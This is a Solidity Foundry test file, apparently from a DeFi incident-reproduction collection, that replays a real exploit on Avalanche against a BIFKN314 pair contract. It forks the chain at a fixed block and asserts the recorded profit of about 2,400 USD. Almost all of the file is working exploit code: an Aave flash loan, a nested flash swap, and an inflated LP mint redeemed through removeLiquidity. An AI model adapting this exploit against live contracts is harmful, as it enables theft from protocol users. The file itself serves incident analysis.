// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,422.73 USD
// Attacker : https://snowtrace.io/address/0x13459bc2db6053524881415321667d5e16f5f15c
// Attack Contract : https://snowtrace.io/address/0x346a89f7f5b42b67fc66ef4b3fb816a2a8bce552
// Vulnerable Contract : https://snowtrace.io/address/0x5b5913eec2031c9d8383e3afcfd269217e481ce1
// Attack Tx : https://snowtrace.io/tx/0xab813aeecd174d51a9f6d7d0eb9b323bccedba6c5cce0e965781a08f3473dbd5

// @Info
// Vulnerable Contract Code : https://snowtrace.io/address/0x5b5913eec2031c9d8383e3afcfd269217e481ce1#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : N/A
// Hacking God : https://t.me/defimon_alerts/1559

interface IBIFKN314PairVictim {
    function addLiquidity(
        uint256 amountToken,
        address recipient,
        uint256 deadline
    ) external payable returns (uint256 liquidity);
    function flashSwap(
        address recipient,
        uint256 amountNativeOut,
        uint256 amountTokenOut,
        bytes calldata data
    ) external;
    function removeLiquidity(
        uint256 amount,
        address recipient,
        uint256 deadline
    ) external returns (uint256 nativeAmount, uint256 tokenAmount);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Mintable {
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function mint(
        address account,
        uint256 amount
    ) external;
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IRadioShackPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x13459bC2Db6053524881415321667d5E16F5F15C;
    address private constant TRACE_EXPLOIT = 0x346a89F7f5B42b67fc66eF4B3fb816a2a8BCe552;
    address private constant PAIR_TOKEN = 0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69;
    bytes32 private constant ATTACKER_PAIR_TOKEN_ALLOWLIST_SLOT =
        0xba6be9e23288ffa9c57814144eb7d775aec968e0f8a659a476f1089c88e191bb;
    uint256 private constant FORK_BLOCK = 66_181_042;
    uint256 private constant NET_AVAX_PROFIT = 91_148_601_593_744_546_787;

    function setUp() public {
        vm.createSelectFork(vm.envOr("AVALANCHE_RPC_URL", string("avalanche")), FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(TRACE_EXPLOIT, "trace exploit contract");
        vm.label(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, "WAVAX");
        vm.label(0x794a61358D6845594F94dc1DB02A252b5b4814aD, "Aave v3 pool");
        vm.label(0x3652E58bC41341B0026334AC20C2948E18c23136, "RadioShack pair");
        vm.label(PAIR_TOKEN, "pair token1");
        vm.label(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1, "BIFKN314 victim");
        vm.label(0xd4C6BA250bFF38218937422d7aCCf55552916558, "BIFKN314 LP token");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = ATTACKER.balance;
        assertEq(
            uint256(vm.load(PAIR_TOKEN, ATTACKER_PAIR_TOKEN_ALLOWLIST_SLOT)),
            1,
            "attacker tx.origin is not pair-token allowlisted"
        );

        vm.startPrank(ATTACKER, ATTACKER);
        AvaxBIFKNPairExploit exploit = new AvaxBIFKNPairExploit(ATTACKER);
        assertEq(address(exploit), TRACE_EXPLOIT, "exploit address mismatch");
        exploit.execute();
        vm.stopPrank();

        assertEq(ATTACKER.balance - beforeBalance, NET_AVAX_PROFIT, "AVAX profit mismatch");
    }
}

contract AvaxBIFKNPairExploit {
    IAaveFlashloan public constant AAVE_POOL = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IWETH public constant WAVAX = IWETH(payable(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7));
    IRadioShackPair public constant PAIR = IRadioShackPair(0x3652E58bC41341B0026334AC20C2948E18c23136);
    IERC20Mintable public constant PAIR_TOKEN = IERC20Mintable(0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69);
    IBIFKN314PairVictim public constant VICTIM = IBIFKN314PairVictim(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1);
    IERC20Mintable public constant LP_TOKEN = IERC20Mintable(0xd4C6BA250bFF38218937422d7aCCf55552916558);

    uint256 private constant FLASH_WAVAX_AMOUNT = 1000 ether;
    uint256 private constant AAVE_PREMIUM = 500_000_000_000_000_000;
    uint256 private constant AAVE_REPAY_AMOUNT = FLASH_WAVAX_AMOUNT + AAVE_PREMIUM;

    uint256 private constant PAIR_TOKEN_BORROW = 10_150_751_249_999_999_999_996;
    uint256 private constant PAIR_TOKEN_MINT = 50_753_756_249_999_999_999;
    uint256 private constant PAIR_TOKEN_REPAY = PAIR_TOKEN_BORROW + PAIR_TOKEN_MINT;

    uint256 private constant FLASH_NATIVE_OUT = 92_901_517_915_106_633_387;
    uint256 private constant FLASH_TOKEN_OUT = 2_444_778_402_553_574_477_179;
    uint256 private constant LIQUIDITY_NATIVE = 92_901_517_915_106_633;
    uint256 private constant LIQUIDITY_TOKEN = 92_901_517_915_106_633;
    uint256 private constant FLASH_NATIVE_REPAY = 93_272_659_479_177_484_387;
    uint256 private constant FLASH_TOKEN_REPAY = FLASH_TOKEN_OUT - LIQUIDITY_TOKEN;
    uint256 private constant LP_MINTED = 44_263_775_251_949_957_759_085_389_766_078_584_238;
    uint256 private constant NET_AVAX_PROFIT = 91_148_601_593_744_546_787;

    address private immutable profitRecipient;

    constructor(
        address recipient
    ) {
        profitRecipient = recipient;
    }

    function execute() external {
        AAVE_POOL.flashLoanSimple(address(this), address(WAVAX), FLASH_WAVAX_AMOUNT, "", 0);

        uint256 profit = address(this).balance;
        require(profit == NET_AVAX_PROFIT, "unexpected AVAX profit");
        (bool success,) = payable(profitRecipient).call{value: profit}("");
        require(success, "profit transfer failed");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(asset == address(WAVAX), "unexpected flash asset");
        require(amount == FLASH_WAVAX_AMOUNT, "unexpected flash amount");
        require(premium == AAVE_PREMIUM, "unexpected premium");

        PAIR.swap(0, PAIR_TOKEN_BORROW, address(this), "flash");

        WAVAX.deposit{value: AAVE_REPAY_AMOUNT}();
        WAVAX.approve(address(AAVE_POOL), AAVE_REPAY_AMOUNT);

        return true;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata
    ) external {
        require(msg.sender == address(PAIR), "unexpected pair");
        require(sender == address(this), "unexpected pair sender");
        require(amount0Out == 0, "unexpected token0 out");
        require(amount1Out == PAIR_TOKEN_BORROW, "unexpected token1 out");

        WAVAX.withdraw(FLASH_WAVAX_AMOUNT);

        VICTIM.flashSwap(address(this), FLASH_NATIVE_OUT, FLASH_TOKEN_OUT, "");
        LP_TOKEN.approve(address(VICTIM), LP_MINTED);
        VICTIM.removeLiquidity(LP_MINTED, address(this), block.timestamp + 3 minutes);

        PAIR_TOKEN.mint(address(this), PAIR_TOKEN_MINT);
        PAIR_TOKEN.transfer(address(PAIR), PAIR_TOKEN_REPAY);
    }

    function BIFKN314CALL(
        address sender,
        uint256 amountNativeOut,
        uint256 amountTokenOut,
        bytes calldata
    ) external {
        require(msg.sender == address(VICTIM), "unexpected flash-swap caller");
        require(sender == address(this), "unexpected flash-swap sender");
        require(amountNativeOut == FLASH_NATIVE_OUT, "unexpected native out");
        require(amountTokenOut == FLASH_TOKEN_OUT, "unexpected token out");

        uint256 minted =
            VICTIM.addLiquidity{value: LIQUIDITY_NATIVE}(LIQUIDITY_TOKEN, address(this), block.timestamp + 3 minutes);
        require(minted == LP_MINTED, "liquidity mint mismatch");

        (bool success,) = payable(address(VICTIM)).call{value: FLASH_NATIVE_REPAY}("");
        require(success, "native flash-swap repayment failed");

        VICTIM.transfer(address(VICTIM), FLASH_TOKEN_REPAY);
    }

    receive() external payable {}
}
